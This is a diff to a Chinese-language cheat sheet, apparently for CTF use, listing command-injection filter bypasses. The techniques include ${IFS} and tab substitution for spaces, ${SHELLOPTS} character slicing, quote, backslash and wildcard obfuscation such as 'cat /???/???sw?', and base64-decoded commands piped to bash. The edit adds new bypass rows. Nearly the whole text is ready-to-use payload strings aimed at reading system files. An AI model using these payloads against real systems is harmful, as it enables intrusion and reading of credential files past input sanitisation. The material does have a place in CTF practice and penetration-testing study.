@@ -83,15 +83,16 @@ copy /b 1.jpg+2.jpg 3 /y
 | 空格     | ${IFS}       |        | cat${IFS}/flag <br> cat${IFS}$9/flag<br> cat$IFS$9/flag                                 |
 |          | +            |        |                                                                                         |
 |          | {}           |        | {ls,-l}                                                                                 |
-|          | <            |        | cat</flag                                                                               |
+|          | < <>         |        | cat</flag cat<>/flag                                                                    |
 |          | url:%20, %09 |        | cat%09/flag <br>X=$'cat\x09./flag.php';$X                                               |
 | 任意字符 | ${SHELLOPTS} |        | `${SHELLOPTS:1:1}  -- r`<br>`${SHELLOPTS:3:1}  -- c`<br>`${SHELLOPTS:3:1}at -- cat`<br> |
-| 任意字符 | \            |        | c\a\t /flag                                                                             |
-| 任意字符 | \*           |        | cat f\* 　　　 cat /???/???sw? <br> ?代表⼀个字符<br> []代表范围内任意一个字符<br>      |
-| 任意字符 | base64       |        | `echo "aWQ=" \| base64 -d` -- id                                                        |
-| 任意字符 | ''           |        | c''at /flag                                                                             |
-| 任意字符 | ""           |        | c""at /flag                                                                             |
-| 任意字符 | 特殊变量@t   |        | ca$@t /flag                                                                             |
+|          | \            |        | c\a\t /flag                                                                             |
+|          | \* ?         |        | cat f\* 　　　 cat /???/???sw? <br> ?代表⼀个字符<br> []代表范围内任意一个字符<br>      |
+|          | base64       |        | `echo "aWQ="\|base64 -d` -- id <br>`echo "aWQ="\|base64 -d\|bash`                       |
+|          | ''           |        | c''at /flag                                                                             |
+|          | ""           |        | c""at /flag                                                                             |
+|          | 特殊变量@t   |        | ca$@t /flag                                                                             |
+|          | 拼接         |        | a=c;b=at;c=flag;$a$b $c                                                                 |
 
 `${IFS}` 对应 内部字段分隔符
 
